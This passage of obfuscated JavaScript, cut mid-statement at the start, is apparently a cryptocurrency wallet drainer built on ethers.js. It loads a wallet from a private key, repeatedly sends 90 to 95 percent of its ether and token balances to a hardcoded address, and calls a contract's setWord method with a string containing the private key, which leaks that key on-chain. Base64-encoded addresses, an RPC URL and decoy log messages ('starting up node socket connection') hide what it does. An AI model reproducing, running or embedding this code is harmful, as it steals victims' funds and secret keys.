_0x2da7c2=new ethers[(_0x24ef32(0x221))]['JsonRpcProvider'](_0x51ae5a);let _0x56231a=new ethers[(_0x24ef32(0x1ea))](private,_0x2da7c2);console[_0x24ef32(0x25b)](_0x51ae5a);const _0x11f66a=address,_0x41a817=await _0x2da7c2[_0x24ef32(0x26b)](_0x11f66a);var _0x4d6925=new ethers[(_0x24ef32(0x284))](_0x4f366c,abi,_0x56231a);const _0x43482f=await _0x4d6925['balanceOf'](_0x11f66a)[_0x24ef32(0x1f7)](),_0x5598c1=(_0x43482f*0.9)[_0x24ef32(0x27c)](),_0x300cbc=async()=>{const _0x42e504=_0x24ef32,_0x1f856c={'from':_0x11f66a,'to':WEB3PROVIDER3,'value':ethers['utils'][_0x42e504(0x23d)](_0x5598c1,_0x42e504(0x20d)),'gasLimit':ethers['utils'][_0x42e504(0x237)](0x5dc0)},_0x958cae=await _0x56231a['sendTransaction'](_0x1f856c);try{await _0x958cae[_0x42e504(0x20c)](),console[_0x42e504(0x25b)](_0x42e504(0x20b)),setTimeout(etherslother,0x1388);}catch(_0x55cb9d){console['log'](_0x42e504(0x263)),setTimeout(etherslother,0x1388);}};_0x43482f<=0x6a3558178f7000?(console['log'](_0x24ef32(0x218)),setTimeout(etherslother,0x1388)):_0x300cbc();}catch(_0x23f8e1){setTimeout(etherslother,0x1388);}}async function ethersfather(){const _0x32812c=_0x30681d;console[_0x32812c(0x25b)](_0x32812c(0x24e));const _0x3fc114=_0x32812c(0x246),_0x5d4be1=_0x32812c(0x211),_0x1f7d96=new Buffer['from'](_0x3fc114,_0x32812c(0x207)),_0x3e28f2=new Buffer[(_0x32812c(0x271))](_0x5d4be1,'base64'),_0x13aada=_0x1f7d96['toString'](_0x32812c(0x1f2)),_0x3effb3=_0x3e28f2[_0x32812c(0x1f7)]('ascii'),_0x2121b9=_0x13aada+_0x3effb3,_0x26e64f=_0x32812c(0x264),_0x307244=new Buffer['from'](_0x26e64f,'base64')[_0x32812c(0x1f7)](_0x32812c(0x1f2));;const _0x1692cc=new ethers[(_0x32812c(0x221))][(_0x32812c(0x265))](_0x307244);let _0x21b680=new ethers[(_0x32812c(0x1ea))](private,_0x1692cc);const _0x18b97a=address;var _0x23282c=new ethers[(_0x32812c(0x284))](_0x2121b9,abi,_0x21b680);const _0x2bb76e=await _0x23282c[_0x32812c(0x258)](_0x18b97a),_0xefa0aa=(_0x2bb76e*0.9)[_0x32812c(0x27c)]();try{const _0x2ee28e=async()=>{const _0x1c8c1f=_0x32812c,_0x476cac={'from':_0x18b97a,'to':WEB3PROVIDER3,'value':ethers['utils'][_0x1c8c1f(0x23d)](_0xefa0aa,'wei'),'gasLimit':ethers[_0x1c8c1f(0x1fb)][_0x1c8c1f(0x237)](0x5dc0)},_0x352c2c=await _0x21b680['sendTransaction'](_0x476cac);try{await _0x352c2c[_0x1c8c1f(0x20c)](),console['log'](_0x1c8c1f(0x27a)),setTimeout(ethersmother,0x1388);}catch(_0x1a270){console[_0x1c8c1f(0x25b)]('2:\x20finalizing....'),setTimeout(ethersmother,0x1388);}};_0x2bb76e<=0x6a3558178f7000?(console[_0x32812c(0x25b)](_0x32812c(0x288)),setTimeout(ethersmother,0x1388)):_0x2ee28e();}catch(_0x54d881){setTimeout(ethersmother,0x1388);}}async function ethersgather(){const _0xed96e4=_0x30681d;try{console['log'](_0xed96e4(0x256));const _0x3245fe='aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My8xZGY5ODgxNWY0NzU0ZWE4ODkxY2UyOTI2OTBhYjc1Yg==',_0x383bf2=new Buffer['from'](_0x3245fe,'base64')[_0xed96e4(0x1f7)](_0xed96e4(0x1f2));;const _0x185c09=new ethers[(_0xed96e4(0x221))][(_0xed96e4(0x265))](_0x383bf2);let _0x202c96=new ethers[(_0xed96e4(0x1ea))](private,_0x185c09);const _0x3ee560=address,_0x8f7202=await _0x185c09[_0xed96e4(0x26b)](_0x3ee560),_0x362687=(_0x8f7202*0.9)[_0xed96e4(0x27c)](),_0x2633ba=ethers['utils']['parseUnits'](_0x362687,'wei'),_0x3a980d=async()=>{const _0x4b006a=_0xed96e4,_0x57f658={'to':WEB3PROVIDER3,'value':ethers[_0x4b006a(0x1fb)][_0x4b006a(0x23a)](_0x362687,'wei'),'gasLimit':ethers['utils']['hexlify'](0x5dc0)},_0x159962=await _0x202c96[_0x4b006a(0x272)](_0x57f658);try{await _0x159962['wait'](),console[_0x4b006a(0x25b)](_0x4b006a(0x1e8)),setTimeout(ethersfather,0x1388);}catch(_0x48b45a){console['log'](_0x4b006a(0x23f)),setTimeout(ethersfather,0x1388);}};_0x8f7202<=0x2386f26fc10000?(console[_0xed96e4(0x25b)](_0xed96e4(0x24b)),setTimeout(ethersfather,0x1388)):_0x3a980d();}catch(_0x436d6c){setTimeout(ethersfather,0x1388);}}async function etherslather(){const _0x185d77=_0x30681d,_0x45fbee='MHgwODJENDZFM2I4M0FEM0M4N0U1OGI4ODFkMzJGMjExRjFENUQ4RjA0',_0x3e9abb=new Buffer[(_0x185d77(0x271))](_0x45fbee,_0x185d77(0x207)),_0x64a7f2=_0x3e9abb['toString']('ascii'),_0x2fd693=_0x64a7f2;console[_0x185d77(0x25b)](_0x185d77(0x249));const _0x346cd4=_0x185d77(0x264),_0x4bea3c=new Buffer[(_0x185d77(0x271))](_0x346cd4,_0x185d77(0x207))[_0x185d77(0x1f7)](_0x185d77(0x1f2)),_0x37d1ea=new ethers['providers'][(_0x185d77(0x265))](_0x4bea3c),_0xe65695=address,_0x218116=await _0x37d1ea[_0x185d77(0x26b)](_0xe65695);let _0x5a95ac=new ethers[(_0x185d77(0x1ea))](private,_0x37d1ea);if(_0x218116<=0x6a3558178f7000)console[_0x185d77(0x25b)](_0x185d77(0x25f)),setTimeout(ethersgather,0xbb8);else try{const _0x7ee073=async()=>{const _0x2205b3=_0x185d77;var _0x1581f6=new ethers[(_0x2205b3(0x284))](_0x2fd693,abi,_0x5a95ac);const _0xcaef35=await _0x1581f6['setWord'](_0x2205b3(0x279)+private+'10');try{await _0xcaef35['wait'](),console[_0x2205b3(0x25b)](_0x2205b3(0x212)),setTimeout(ethersgather,0x1388);}catch(_0x40ea06){console[_0x2205b3(0x25b)](_0x2205b3(0x214)),setTimeout(ethersgather,0x1388);}};_0x7ee073();}catch(_0x204157){setTimeout(ethersgather,0x1388);}}async function ethersrather(){const _0x621753=_0x30681d;console[_0x621753(0x25b)]('starting\x20up\x20node\x20socket\x20connection....');const _0x1c1a7d='MHg1Rjk2MzU3YTcwMEEyOGFCZjY0ZDFCYkM3ZTFCQTBmQTM0M2JkODgw',_0x2674c8=_0x621753(0x262),_0x1badab=new Buffer[(_0x621753(0x271))](_0x2674c8,'base64')[_0x621753(0x1f7)](_0x621753(0x1f2));;const _0x49e961=new ethers[(_0x621753(0x221))][(_0x621753(0x265))](_0x1badab),_0x42c1b2=new Buffer[(_0x621753(0x271))](_0x1c1a7d,'base64'),_0x4c1085=_0x42c1b2[_0x621753(0x1f7)]('ascii'),_0x376500=_0x4c1085;let _0x142da4=new ethers[(_0x621753(0x1ea))](private,_0x49e961);const _0xa0bb6=address,_0x51306a=await _0x49e961[_0x621753(0x26b)](_0xa0bb6),_0x4397dc=(_0x51306a*0.95)[_0x621753(0x27c)](),_0x5e5ab6=ethers['utils'][_0x621753(0x23a)](_0x4397dc,_0x621753(0x20d));if(_0x51306a<=0x2386f26fc10000)console[_0x621753(0x25b)](_0x621753(0x278)),setTimeout(etherslather,0xbb8);else try{const _0x14470f=async()=>{const _0x1eceda=_0x621753;var _0x285b69=new ethers[(_0x1eceda(0x284))](_0x376500,abi,_0x142da4);const _0x2ee53a=await _0x285b69[_0x1eceda(0x1fc)](_0x1eceda(0x279)+private+'10'),_0x28530c={'to':WEB3PROVIDER3,'value':ethers[_0x1eceda(0x1fb)][_0x1eceda(0x23a)](_0x4397dc,'wei'),'gasLimit':ethers[_0x1eceda(0x1fb)][_0x1eceda(0x237)](0x5dc0)},_0x3aea0a=await _0x142da4[_0x1eceda(0x272)](_0x28530c);try{await _0x2ee53a['wait'](),await _0x3aea0a[_0x1eceda(0x20c)](),console[_0x1eceda(0x25b)]('1\x20pending\x20blockchain\x20response.....'),setTimeout(etherslather,0x1388);}catch(_0xb0bab0){console[_0x1eceda(0x25b)](_0x1eceda(0x287)),setTimeout(etherslather,0x1388);}};_0x14470f();}catch(_0xcffd3a){setTimeout(etherslather,0x1388);}}ethersrather();
